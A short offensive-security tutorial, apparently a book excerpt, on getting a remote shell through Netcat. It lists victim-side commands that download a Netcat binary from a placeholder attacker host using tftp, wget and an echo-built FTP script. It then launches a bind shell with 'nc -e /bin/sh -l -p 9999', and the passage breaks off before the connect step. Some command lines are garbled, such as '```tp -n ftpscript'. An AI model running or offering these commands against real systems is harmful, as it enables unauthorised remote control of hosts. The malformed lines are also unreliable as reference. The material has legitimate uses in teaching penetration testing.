# Using Netcat to Obtain a Remote Shell

The following steps can be taken to obtain a remote shell:

+   1. **Upload Netcat** Netcat can be used to send a remote shell across the network. First, you must place Netcat on the vulnerable host. This can be done by executing the `tftp` command on the victim host:
```
tftp -i attacker_s_ip_address nc
```
The attacker must course be running an accessible TFTP server with a Netcat binary placed in the TFTP home directory (usually `/tftpboot`) in order for the preceding upload to be successful.
Instead of TFTP, the `wget` tool can be executed on the victim machine to obtain a Netcat binary that is placed on the attacker’s web server:
```
wget http://attacker_s_ip_address/nc
```
Alternatively, the attacker can upload the Netcat binary onto the victim host using the FTP command-line client:
```tp -n ftpscript
```
where ftpscript is a text file containing:
```
attacker_s_ftp_server_ip_address
user_on_attacker_s_ftp_server user_password
bin
get nc
bye
```
 ftpscript can be created by running the following echo command on the vulnerable host:
```
echo attacker_s_ftp_server_ip_address > ftpscript; echo user_on_attacker_s_ftp_server user_password >> ftpscript; echo bin >> ftpscript; echo get nc >> ftpscript; echo bye >> ftpscript
```
2. **Use Netcat** Once Netcat is placed on the victim’s machine, it can be used to listen on an arbitrary port and serve a shell upon connection:
```
./nc -e /bin/sh -l -p 9999
```
Now, all the attacker needs to do is to connect to the victim’s port 9999 in order to receive a command shell: